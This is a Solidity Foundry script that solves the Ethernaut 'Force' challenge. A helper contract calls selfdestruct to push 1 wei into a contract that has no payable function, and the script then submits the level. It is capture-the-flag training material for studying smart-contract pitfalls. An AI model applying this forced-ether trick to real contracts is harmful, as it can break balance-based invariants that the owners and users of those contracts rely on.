// SPDX-License-Identifier: MIT
pragma solidity 0.8.21;

import {Script, console2} from "forge-std/Script.sol";
import {EthernautHelper} from "../setup/EthernautHelper.sol";

// NOTE You can import your helper contracts & create interfaces here
import {Force} from "../../challenge-contracts/07-Force.sol";

contract ForceSolution is Script, EthernautHelper {
    address constant LEVEL_ADDRESS = 0xb6c2Ec883DaAac76D8922519E63f875c2ec65575;
    uint256 heroPrivateKey = vm.envUint("PRIVATE_KEY");

    function run() public {
        vm.startBroadcast(heroPrivateKey);
        // NOTE this is the address of your challenge contract
        address challengeInstance = createInstance(LEVEL_ADDRESS);

        ////////////////////////////////////////////////////////////////////////////////////
        // Start of Ric Li C's Solution
        ////////////////////////////////////////////////////////////////////////////////////
        // Step 1: Deploy new EtherSender contract;
        EtherSender sender = new EtherSender();

        // Step 2: Call `forceSend()` function of the EtherSender contract,
        //         with 1 wei as msg.value;
        sender.forceSend{value: 1 wei}(payable(challengeInstance));

        // Step 3: Confirm that the Force contract has non-zero balance now.
        uint256 balance = challengeInstance.balance;
        require(balance == 1 wei, "Balance check failed");

        ////////////////////////////////////////////////////////////////////////////////////
        // End of Ric Li C's Solution
        ////////////////////////////////////////////////////////////////////////////////////

        // SUBMIT CHALLENGE. (DON'T EDIT)
        bool levelSuccess = submitInstance(challengeInstance);
        require(levelSuccess, "Challenge not passed yet");
        vm.stopBroadcast();

        console2.log(successMessage(7));
    }
}

////////////////////////////////////////////////////////////////////////////////////
// Start of Ric Li C's Solution (Extra Contract)
// Additional contract codes to help solve this puzzle
////////////////////////////////////////////////////////////////////////////////////
contract EtherSender {
    // This function sends Ether to the Force contract using selfdestruct
    function forceSend(address payable forceAddress) public payable {
        require(msg.value > 0, "Must send some Ether");

        // Use selfdestruct to send all the Ether to the Force contract
        selfdestruct(forceAddress);
    }
}
////////////////////////////////////////////////////////////////////////////////////
// End of Ric Li C's Solution (Extra Contract)
////////////////////////////////////////////////////////////////////////////////////
